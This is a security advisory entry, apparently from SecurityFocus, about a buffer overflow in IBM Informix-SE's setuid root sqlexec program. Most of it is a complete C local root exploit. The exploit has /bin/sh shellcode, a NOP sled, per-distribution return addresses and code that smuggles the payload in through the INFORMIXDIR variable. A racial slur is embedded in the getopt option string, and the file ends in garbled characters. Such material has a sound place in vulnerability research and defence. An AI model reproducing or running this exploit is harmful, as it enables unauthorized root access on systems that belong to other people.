source: http://www.securityfocus.com/bid/4891/info

Informix is an enterprise database distributed and maintained by IBM.

A buffer overflow vulnerability has been reported for Informix-SE for Linux. The overflow is due to an unbounded string copy of the INFORMIXDIR environment variable to a local buffer. There is at least one setuid root executable that is vulnerable, `sqlexec'. A malicious user may exploit the overflow condition in sqlexec to gain root privileges. 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>

#define BUFFERSIZE 2032

/* linux x86 shellcode */
char lunixshell[] =  "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
 "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" 
 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" 
 "\x80\xe8\xdc\xff\xff\xff/bin/sh";

struct target
 {
  char *os_name;
  u_long retadd;
  u_long offset;
};

struct target targets[] =
 {
  { "RedHat 7.0 - Guinness   ", 0xbfffee04, 895,         },
  { "Mandrake 8.2 - Bluebird", 0xbfffee30, -1999,         },
   {
     NULL, 0L, 0L
  }
};

int type=-1;

void usage(char *cmd)
{
    int i=0;

      printf("[<>] - IBM x86 IBM INFORMIX SE-7.25 sqlexec local root exploit\n");
      printf("[<>] - by smurf, division7 security systems\n");
	printf("[<>] - usage: %s  -t target -r [return address] -o [offset]\n", cmd);
      printf("[<>] - Targets:\n\n");

      while( targets[i].os_name != NULL)
         printf ("[ Type %d:  [ %s ]\n", i++, targets[i].os_name);
}

int main(int argc, char *argv[])
{
	int i, c, os;
	long *addr_ptr;
	char *buffer, *ptr, *osptr;

	
	/* offset = atoi(argv[1]);  */
 	/* esp    = retadd; */
      /* ret    = esp-offset; */


     if(argc < 3)
       {
         usage(argv[0]);
         return 1;
       }

      while(( c = getopt (argc, argv, "t:r:o:nigger"))!= EOF){

      switch (c)
        {

         case 't':
            type = atoi(optarg);
            break;
 
         case 'r':
            targets[type].retadd = strtoul(optarg, NULL, 16);
            break;

         case 'o':
            targets[type].offset = atoi(optarg);
            break;

        default:
          usage(argv[0]);
          return 1;
        }
   }


	printf("[<>] - Stack pointer: 0x%x\n", targets[type].retadd);
	printf("[<>] - Offset: 0x%x\n", targets[type].offset);
	printf("[<>] - Return addr: 0x%x\n", targets[type].retadd - targets[type].offset);


	/* allocate memory for our buffer */
	if(!(buffer = malloc(BUFFERSIZE))) {
		printf("Couldn't allocate memory.\n");
		exit(-1);
	}

	/* fill buffer with ret addr's */
	ptr = buffer;
	addr_ptr = (long *)ptr;
	for(i=0; i<BUFFERSIZE; i+=4)
		*(addr_ptr++) = targets[type].retadd - targets[type].offset;

	/* fill first half of buffer with NOPs */
	for(i=0; i<BUFFERSIZE/2; i++)
		buffer[i] = '\x90';

	/* insert shellcode in the middle */
	ptr = buffer + ((BUFFERSIZE/2) - (strlen(lunixshell)/2));
	for(i=0; i<strlen(lunixshell); i++)
		*(ptr++) = lunixshell[i];


	/* call the vulnerable program passing our exploit buffer as the argument */

	buffer[BUFFERSIZE-1] = 0;
      setenv("INFORMIXDIR", buffer, 1);
	execl("./sqlexec", "sqlexec", NULL); 
	return 0;
}

����������������������������������������������������������������������������������������������������������������������������